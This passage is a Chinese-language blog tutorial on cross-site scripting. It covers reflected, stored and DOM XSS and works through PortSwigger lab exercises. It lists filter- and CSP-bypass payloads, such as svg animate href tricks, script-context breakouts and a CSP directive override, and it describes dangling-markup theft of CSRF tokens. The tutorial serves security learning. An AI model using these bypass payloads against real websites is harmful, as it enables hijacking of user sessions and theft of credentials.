@@ -1,0 +1,1777 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="从0到1完全掌握XSS, 芜风">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>从0到1完全掌握XSS | 芜风</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">芜风</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">芜风</div>
+        <div class="logo-desc">
+            
+            且将新火试新茶，诗酒趁年华
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">从0到1完全掌握XSS</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Port/" class="post-category">
+                                Port
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-05-05
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.4k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    13 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>从0到1完全掌握 XSS</p>
+<span id="more"></span>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS Payload 大全</a></p>
+<h1 id="从0到1完全掌握-XSS"><a href="#从0到1完全掌握-XSS" class="headerlink" title="从0到1完全掌握 XSS"></a>从0到1完全掌握 XSS</h1><ul>
+<li>文章篇幅较长，建议分块观看学习。<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2></li>
+</ul>
+<p>本人二刷 XSS，在一刷的时候是以漏洞挖掘与漏洞利用为主，实际上完全对于实战根本没有概念，出去工作一段时间之后才算是拿出来应用。写这篇文章是打算再好好地梳理一遍 XSS。</p>
+<blockquote>
+<p>XSS 的本质是一种高级钓鱼手法。</p>
+</blockquote>
+<h2 id="0x02-什么是-XSS"><a href="#0x02-什么是-XSS" class="headerlink" title="0x02 什么是 XSS"></a>0x02 什么是 XSS</h2><p>XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。<br>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到提供给其它用户使用的页面中。</p>
+<ul>
+<li>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。代码长这样。</li>
+</ul>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/XSSCode.png" class="">
+
+<h2 id="0x03-XSS-的危害"><a href="#0x03-XSS-的危害" class="headerlink" title="0x03 XSS 的危害"></a>0x03 XSS 的危害</h2><p>前文我们说 XSS 本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p>
+<h2 id="0x04-XSS-简单应用场景举例"><a href="#0x04-XSS-简单应用场景举例" class="headerlink" title="0x04 XSS 简单应用场景举例"></a>0x04 XSS 简单应用场景举例</h2><p>这里我想先介绍 XSS 的应用方法，如此一来讲起来不会太空洞，也能与下面的攻击手段有所呼应。以反射型 XSS 为例，原理图如下。</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/ReflectUsePic.png" class="">
+
+<ul>
+<li>这里借用国光师傅的图片进行分析</li>
+</ul>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/QQZoneFish.png" class="">
+
+<p>这是一个恶意的 QQ 空间钓鱼网站，我们在输入框内输入 <code>username%20&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，再对登陆的按钮设置一个 href 到真正的 QQ 空间官网。然而当时用户输入的用户名密码已经被攻击者窃取了。</p>
+<h2 id="0x05-XSS-基本攻击手段"><a href="#0x05-XSS-基本攻击手段" class="headerlink" title="0x05 XSS 基本攻击手段"></a>0x05 XSS 基本攻击手段</h2><ul>
+<li>XSS 根据效果不同主要分为三种类型</li>
+<li>反射型 XSS，存储型 XSS，DOM 型 XSS</li>
+</ul>
+<p>危害性来说，存储型 XSS &gt;&gt; 反射型 XSS ~&#x3D; DOM 型 XSS<br>我们接下来细讲一下这三种 XSS 的攻击手段。</p>
+<h3 id="1-反射型-XSS-及绕过手段"><a href="#1-反射型-XSS-及绕过手段" class="headerlink" title="1. 反射型 XSS 及绕过手段"></a>1. 反射型 XSS 及绕过手段</h3><h4 id="1-什么是反射型-XSS"><a href="#1-什么是反射型-XSS" class="headerlink" title="(1) 什么是反射型 XSS"></a>(1) 什么是反射型 XSS</h4><p>反射型 XSS，也叫非持久型 XSS，转瞬即逝。</p>
+<p>利用比较简单，比如在搜索框中，我记得当时 2020 年，b 站的搜索框还是存在 XSS 的，现在没有了。</p>
+<p>反射型 XSS 的 Payload 如下</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>script<span class="token operator">></span>
+</code></pre>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/ReflectEasyXSS.png" class="">
+
+<p>效果如图所示</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/ReflectEasyXSShow.png" class="">
+
+<p>XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。</p>
+<h5 id="一、当大多数标签被禁止时的绕过"><a href="#一、当大多数标签被禁止时的绕过" class="headerlink" title="一、当大多数标签被禁止时的绕过"></a>一、当大多数标签被禁止时的绕过</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">Lab: Reflected XSS into HTML context with most tags and attributes blocked</a></p>
+</blockquote>
+<p>还是常规的 Fuzz 测试，在尝试 XSS 攻击之后，若失败了就进行 Fuzz 测试，因为无法排除是不是 WAF 过滤了部分关键字。</p>
+<p>探测出来 onresize 标签还是有效的，我们可以通过这一串 Payload 唤起打印服务</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body onresize<span class="token operator">=</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>" onload<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token string">'100px'</span><span class="token operator">></span>
+</code></pre>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/BlockTags.png" class="">
+
+<h5 id="二、当事件处理器与-href-被禁用时的绕过"><a href="#二、当事件处理器与-href-被禁用时的绕过" class="headerlink" title="二、当事件处理器与 href 被禁用时的绕过"></a>二、当事件处理器与 href 被禁用时的绕过</h5><ul>
+<li>老样子还是需要 Fuzz 的。如果渗透测试真正遇到这种情况的话，<code>svg</code> 标签的绕过方式还是主流。</li>
+</ul>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">Lab: Reflected XSS with event handlers and href attributes blocked</a></p>
+</blockquote>
+<p>Payload</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>svg<span class="token operator">></span>
+    <span class="token operator">&lt;</span>a<span class="token operator">></span>
+    <span class="token operator">&lt;</span>animate attributeName<span class="token operator">=</span>href
+     values<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">></span>
+        <span class="token operator">&lt;</span>text x<span class="token operator">=</span><span class="token number">20</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token operator">></span>Click me<span class="token operator">&lt;</span><span class="token operator">/</span>text<span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
+</code></pre>
+<p>还有一些 <code>svg</code> 标签的绕过手段</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>animatetransform onbegin<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
+</code></pre>
+<h5 id="三、对-script-进行闭合后构造-Payload"><a href="#三、对-script-进行闭合后构造-Payload" class="headerlink" title="三、对 script 进行闭合后构造 Payload"></a>三、对 script 进行闭合后构造 Payload</h5><p>对某些语句中的符号进行闭合。<br>有些 Web 后端代码会通过反斜杠转义，对很多单引号字符进行过滤，那么转义之后的代码就不能进行原 Payload 的作用。</p>
+<ul>
+<li>XSS Insert Into-&gt; JavaScript</li>
+</ul>
+<p>这种 Payload 可以是通过修改 Web 网站内部 JavaScript 来实现的，因为 JavaScript 本身就可以直接执行 alert 方法，无需使用 <code>&lt;script&gt;</code> 标签。</p>
+<p>一般的 Payload</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token string">'-alert(document.domain)-'</span> 
+'<span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span>
+</code></pre>
+<h5 id="四、绕过-CSP-攻击"><a href="#四、绕过-CSP-攻击" class="headerlink" title="四、绕过 CSP 攻击"></a>四、绕过 CSP 攻击</h5><ul>
+<li>CSP：content security policy，比较严格的防御 XSS 手段。</li>
+</ul>
+<p>它一般在 HTTP 包里面长这样</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/CSPLike.png" class="">
+
+<p>CSP通过这样的指令限制只能加载与页面本身相同来源的资源  </p>
+<pre class=" language-http"><code class="language-http">script-src 'self'
+</code></pre>
+<p>通过下面的指令限制只能从指定域中加载资源  </p>
+<pre class=" language-http"><code class="language-http">script-src https://scripts.normal-website.com
+</code></pre>
+<p>但是这种允许外部域的做法还是有风险的，如果攻击者可以向其传递恶意脚本也会遭到攻击的。而且应该也同时不信任来自 CDN 的资源，因为也有被投放的风险。CSP 还通过随机数和哈希值来指定可信资源。</p>
+<ul>
+<li>CSP 的指令指定一个随机数，加载脚本的标签也必须有相同的随机数。否则就不执行该脚本。并秉持一次性的原则，避免被猜解。</li>
+<li>CSP 指令可以指定脚本内容的哈希值。不匹配也是不会执行的。</li>
+</ul>
+<h6 id="绕过方式一-悬空标记攻击"><a href="#绕过方式一-悬空标记攻击" class="headerlink" title="绕过方式一 悬空标记攻击"></a>绕过方式一 悬空标记攻击</h6><ul>
+<li>这种和闭合语句的攻击差不多。</li>
+</ul>
+<p>虽然 CSP 通常可以阻止脚本，但是经常不会禁止加载图片资源，这就导致可以利用 <code>img</code> 标签窃取 CSRF 令牌。</p>
+<p>有些浏览器比如 chrome，就有内置的悬空标记缓解功能，这个功能可以阻止包含某些字符的请求，比如换行符、未编码的新一行符或者尖括号。还有一些策略更为严格，可以防止所有形式的外部请求。</p>
+<p>但是还是可以通过注入一个 HTML 元素，点击该元素就会将该元素包含的所有内容发送到外部服务器的方式绕过这种策略，这里感觉有点像点击劫持攻击。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</a></p>
+</blockquote>
+<p>首先我们观察一下修改邮箱的表单要提交哪些信息</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/DanglingMarkupSubmitShow.png" class="">
+
+<p>接着利用悬挂标记攻击将 CSRF Token 窃取出来，所以我们这样构造 Payload </p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/DanglingMarkupExp.png" class="">
+
+<p>再然后用 CSRF 盗用 token，再发包即可。</p>
+<h6 id="绕过方式二-对-CSP-限制不严格的情况下攻击"><a href="#绕过方式二-对-CSP-限制不严格的情况下攻击" class="headerlink" title="绕过方式二  对 CSP 限制不严格的情况下攻击"></a>绕过方式二  对 CSP 限制不严格的情况下攻击</h6><ul>
+<li>CSP 是有设置的，若 <code>base-url</code> 为空的话，可以通过 token 值来添加新的 CSP 指令。</li>
+</ul>
+<p>Payload</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&amp;</span>token<span class="token operator">=</span><span class="token punctuation">;</span>script<span class="token operator">-</span>src<span class="token operator">-</span>elem <span class="token string">'unsafe-inline'</span>
+</code></pre>
+<p>我们使用 <code>script-src-elem</code> 对 CSP 进行覆盖，从而进行 XSS 攻击。</p>
+<h3 id="2-存储型-XSS"><a href="#2-存储型-XSS" class="headerlink" title="2. 存储型 XSS"></a>2. 存储型 XSS</h3><p>存储型 XSS 是危害性最大的 XSS 了，它一般出现于评论留言功能处，大致的利用方法与绕过手段与反射型 XSS 很像，原理图如下。</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/StoredXSS.png" class="">
+
+<ul>
+<li>如果执行起来也是插入进上下文标签当中，和之前反射型 XSS 的代码图类似，都是没有加任何的过滤手段，如图。</li>
+</ul>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/StoredXSSCode.png" class="">
+
+<p>我们在新增的评论中将 username 构造成 Payload</p>
+<pre class=" language-javascript"><code class="language-javascript">username<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+</code></pre>
+<p>而这一条评论，又会被保存到数组或者是数据库当中(这个看 Web 程序的设计)，就造成了存储型 XSS。</p>
+<ul>
+<li>绕过手段不再逼逼，和反射型 XSS 是异曲同工。</li>
+</ul>
+<h3 id="3-DOM-型-XSS-重点"><a href="#3-DOM-型-XSS-重点" class="headerlink" title="3. DOM 型 XSS(重点!)"></a>3. DOM 型 XSS(重点!)</h3><p>DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如 <code>img</code>，<code>input</code> 等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。</p>
+<blockquote>
+<p>我个人觉得 DOM 型 XSS 与反射型，存储型 XSS 的区别可谓不是一点半点，虽然有人把 DOM 型 XSS 归结到反射型 XSS 当中，但是我们看下去，会感受到些许不同。</p>
+</blockquote>
+<p>DOM 型 XSS 全部都是由前端进行触发的。所以我们平常如果挖洞，还是很考验代码审计的耐心的。</p>
+<ul>
+<li>我们下面讲几种常见的攻击方式，在这之前，我们先把可以利用的 DOM 节点，以及其 Payload 拉出来。Payload 摘自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1838791">HACK 师傅的文章</a></li>
+</ul>
+<h4 id="一些常用的标签与属性"><a href="#一些常用的标签与属性" class="headerlink" title="一些常用的标签与属性"></a><strong>一些常用的标签与属性</strong></h4><p>下面我列举的标签大部分是可以自动触发 js 代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
+<h5 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt 标签"></a><strong>scirpt 标签</strong></h5><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+</code></pre>
+<h5 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a><strong>img 标签</strong></h5><p><code>&lt;img&gt;</code> 标签定义 HTML 页面中的图像。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
+</code></pre>
+<h5 id="input-标签"><a href="#input-标签" class="headerlink" title="input 标签"></a><strong>input 标签</strong></h5><p><code>&lt;input&gt;</code> 标签规定了用户可以在其中输入数据的输入字段。<br>onfocus 事件在对象获得焦点时发生：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
+</code></pre>
+<p>竞争焦点，从而触发 onblur 事件：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input onblur<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> autofocus<span class="token operator">></span><span class="token operator">&lt;</span>input autofocus<span class="token operator">></span> 
+</code></pre>
+<p>input 标签的 autofocus 属性规定当页面加载时 <code>&lt;input&gt;</code> 元素应该自动获得焦点。可以通过 autofocus 属性自动执行本身的 focus 事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input onfocus<span class="token operator">=</span><span class="token string">"alert(1);"</span> autofocus<span class="token operator">></span>
+</code></pre>
+<h5 id="details-标签"><a href="#details-标签" class="headerlink" title="details 标签"></a><strong>details 标签</strong></h5><p><code>&lt;details&gt;</code> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <code>&lt;details&gt;</code> 元素时触发：</p>
